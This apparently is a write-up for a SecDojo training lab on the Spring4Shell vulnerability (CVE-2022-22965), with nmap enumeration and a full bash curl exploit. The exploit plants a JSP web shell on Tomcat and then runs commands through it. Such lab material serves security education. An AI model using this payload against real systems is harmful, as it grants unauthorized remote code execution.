![image](https://user-images.githubusercontent.com/48088579/163294479-53aa159b-590b-46af-9a3c-dc8436b654cb.png)

# spring4shell-secdojo
A write-up for SecDojo Spring4shell lab.

[SecDojo](https://www.sec-dojo.com/) CyberLabs is a cyber security learning platform where you can put in practice your theoretical knowledge throughout training in LAB environments in order to help you assess the required knowledge for a proper acquisition of the concepts.

# What is Spring4Shell vulnerability? A brief explanation of Spring4Shell.

Spring4Shell (CVE-2022-22965) is a bypass of the patch for CVE-2010-1622, the vulnerability allows the attacker to upload a .JSP web shell into the target machine allowing him/her to execute commands and gain control over the target.

Spring4Shell main core problem is related to how Spring MVC works to handle a specified class based on the parameters provided by the user, and this can be used to overwrite Tomcat logging properties to create a new malicious file using ClassLoader module.

# Spring4Shell Lab:

![image](https://user-images.githubusercontent.com/48088579/163294527-5c36d2de-05b4-43f2-b752-bab39ac5f2bd.png)

Target IP: 172.16.4.33

## Enumeration and Exploitation:
```
nmap -sC -sV 172.16.4.33 | grep open
```
```
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
```
A tomcat server is running on 8080 port redirecting us to /login-form/greeting, where we will use our malicious class and gain control using [exploit.py](https://github.com/reznok/Spring4Shell-POC/blob/master/exploit.py):
![image](https://user-images.githubusercontent.com/48088579/163294632-5d4c22ba-9340-4fb1-8b57-1f068fccd03c.png)

or shell version:

```bash
#!/bin/bash
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_" http://172.16.4.33:8080/login-form/greeting &>/dev/null

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=webshell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://172.16.4.33:8080/login-form/greeting &>/dev/null; sleep 3

curl -H "prefix: <%" -H "suffix: %>//" -H "c: Runtime" -H "Content-Type: application/x-www-form-urlencoded" http://172.16.4.33:8080/login-form/greeting &>/dev/null; sleep 1
```
Where our web shell in /webshell.jsp:
```bash
curl http://172.16.4.33:8080/webshell.jsp?cmd=id --output -
```
# Resources:
- https://www.trendmicro.com/en_no/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html
- https://unit42.paloaltonetworks.com/cve-2022-22965-springshell/
- https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/
